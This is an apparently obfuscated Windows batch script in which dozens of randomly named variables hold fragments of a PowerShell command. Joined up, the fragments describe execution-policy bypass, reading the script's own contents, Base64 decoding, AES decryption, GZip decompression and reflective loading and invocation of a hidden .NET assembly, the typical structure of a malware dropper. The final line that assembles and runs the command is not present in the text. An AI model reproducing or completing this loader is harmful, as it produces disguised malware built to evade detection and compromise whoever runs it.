@echo off
set "pZXPxRAmTO=grap"
set "ZgQErgQEbM=-nop"
set "jAAJSMoVYE=prmv"
set "ZIgrKQHFxN=)($h"
set "dVtVaBKvai=();$"
set "JWFSMkAMSG=prmv"
set "siYKbGXAGn=HY ="
set "gqFEPUQSuk= [Sy"
set "XZkoElanDq=tem."
set "sAMeUpZEaG=vert"
set "QFogcFoZAc==');"
set "EQunmbYKRF=Invo"
set "FeVuzWuSbT=]::("
set "YxonSAGktO=.Cop"
set "jtdRetiYVn=zuZI"
set "KDFrVkMMNK=gjYA"
set "EwVxmRkedt=ion."
set "PYwtuarvMX=N = "
set "yfDIXesEHd=em.I"
set "RvloSIPSNe=]::C"
set "jfvZmhKvvs='gni"
set "lZnbWqiBBW=nirt"
set "reAWjYGkaV=E = "
set "WEAimrVfCe='0Pg"
set "YMMlSxREPj=);$K"
set "LAfxGiIbwX===')"
set "AahbTylGyI=m.IO"
set "xlajHoUXHr=am;$"
set "nzKqbuczmh=ss -"
set "kUmtkyuAsb=.Cry"
set "ToPWKAGxed=-joi"
set "VuemdLZDbf= = ["
set "KBOhBfipJq=.Mod"
set "NBkxGmKIYG=bypa"
set "GZwpImnNxQ=;$lA"
set "vaEuQxoCJb=106u"
set "YfuZHwUkfN=CFxo"
set "CealuRvGxv=gth)"
set "IUJNrrcoDJ=hy.A"
set "TIIwxRQStJ=Syst"
set "jbfmLuiEsW=ew-O"
set "VzDoikScGX=bstr"
set "eIlKbqlQxD=Fina"
set "nihgGhdyfZ=.GZi"
set "HDYoijHciX=YxVw"
set "LmRUtvdqkw=Star"
set "fXSucVzjhH=hWgv"
set "qzHcXzpuhn=mory"
set "NTZmIzPZRe=L4Yi"
set "XYcrunEsty=join"
set "mMhiYyWfkH=();$"
set "siiGyZMJom=eam("
set "mCLtdanepV=nage"
set "gjLxOlJJQe=orF'"
set "peqIGiRwjr=('%~f0'"
set "ngrsOMwXCd=::De"
set "nCwXFqvfix=gnir"
set "ZffeyuxGmD=.Len"
set "KCAWJLYMzc=ode]"
set "UOSRomcSOY=lVaa"
set "eyXGkApGow=iron"
set "EmUJyRQcjp=.Dis"
set "wuSfsmwNBi=ose("
set "ELUjXYuwLc=rans"
set "nbFNXHsupM=pStr"
set "eXZIUzozwg=e = "
set "OPKePPeeUu=y.Ci"
set "ZTXcdGpGPK=]::("
set "zPcdDkCxgp=tion"
set "TFureIBpTv=$hWg"
set "EJRclnaOCS=tem."
set "fQdKzRXUri=g = "
set "vGebdgAWeD=New-"
set "sFdrsjpIar=le  "
set "QhEKQsftcu=comm"
set "aZuSSezOin=vE);"
set "jtnJwKHwHt=urit"
set "TaZrjBgtsO= = $"
set "sFzXPzPGPH=ct S"
set "zEKFjlfCdQ=Disp"
set "IiAbYewDnm=prmv"
set "OYMgyQFicH=, (,"
set "pjKWCyMTxe= = N"
set "IHvCrxjoOA=tem."
set "FrMQVLZCZY=Obje"
set "tDjKmcqBrA=yste"
set "NwHIFJkKcA=  $t"
set "gsGwPrUueg=daeR"
set "onuDFtwTTt=ecry"
set "CnySbXesyL=$hWg"
set "ElvAaqaDnu=pher"
set "kcpSQFatzf=$KBs"
set "XJrrSMKmge=ispo"
set "ztuHCyWMTF=s75K"
set "IsIWrHSyoE=yFo."
set "latelYDnVj=Syst"
set "DPESdYEkus=gsYZ"
set "OoTTrypmLm=lBlo"
set "lQiggXcmnb= if "
set "BiPiDxFdYT=ddin"
set "bPvNFtPzsL=.Com"
set "aMxQzSMAyl=comp"
set "TdQcLnUuPj=yFo "
set "iUvspLhIHq=:('g"
set "rYmolKxeKn=ypto"
set "tBVIkezaDD=$KBs"
set "ERFkBMzqhP=tS46"
set "cyULMugXwG=.Cry"
set "vOLWBmQuAP=6] -"
set "gOcuMOkcdh=oryS"
set "lXKMvjwqpi=rt]:"
set "PYUBRNPPfg= '')"
set "jLxEvDzgPw=fdT."
set "GOgrpAXDyZ=n ''"
set "waotAWVlWO=zHhH"
set "PXggqdzlex=rity"
set "JAyodDZXvd=ddin"
set "RdHxnFALKA=Y) {"
set "cHXyEivpOR=aC, "
set "hagrGgVgmy=se()"
set "JKeJyhUGtm=esaB"
set "fBNIVHMZTp=m(, "
set "TeINZAKrio=WgvE"
set "lOtXELScNa=hWgv"
set "zeLANQgxvB=1] -"
set "kbdLysyxer=sion"
set "nGInacpfjH=.-16"
set "sYgKtZyBLy=GWKI"
set "gEOKOfzSMI=O.Me"
set "IjnvENzZqZ=em.C"
set "DfBOlUqmIp=3); "
set "sKJiJULJhz=trea"
set "dBzhyKvckn=embl"
set "mJiCBwwuXj=aaC."
set "qjKhRoyzCR=saBm"
set "CeUmeWHsuI=);$h"
set "THedbuhoWq=.Dis"
set "VQnJKLlKcq=ress"
set "yzXDTWSuOs=ptog"
set "joyYqGwSnG=Disp"
set "mCXWhgaOFH='[-1"
set "PFPApdRZSS=]::N"
set "VfBPDjagIs=v.Pa"
set "GOvAjcHtSl=E = "
set "HyuJFstYJG=t Sy"
set "FEjHluCqDl=F'[-"
set "UvbALeOtZJ=ing("
set "IlIdunfBDd=oint"
set "CuhqpSCXHu=PxEW"
set "UnYVhQAgbH=gMod"
set "VHGGSvHkSS=-ep "
set "NEZioGGBNA=E, 0"
set "VjEViGDKLi=raph"
set "UHWiJICXTb=$KBs"
set "hXRFfAYGcw=-Obj"
set "VjfHujVfcO=PKCS"
set "EkpWpjdGzs=y.Pa"
set "RJZJQXybgM=] -j"
set "UXCLgScalq=ZmX "
set "HSuMItXmIS=ewLi"
set "WKTsJQPHnN=ect "
